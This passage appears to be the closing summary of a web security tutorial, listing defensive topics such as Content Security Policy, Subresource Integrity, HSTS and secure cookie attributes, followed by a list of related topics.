- **Content Security Policy**: Basic and advanced CSP configurations with nonces and reporting
- **Subresource Integrity**: Generating and using SRI hashes for CDN resources
- **HTTPS Enforcement**: Redirecting to HTTPS and HSTS headers
- **Secure Cookies**: HttpOnly, Secure, SameSite attributes, signing, and prefixes

Security requires defense in depth: multiple layers of protection working together.

---

**Related Topics:**

- Authentication and Authorization
- OAuth and JWT Security
- API Security
- Penetration Testing
- Security Headers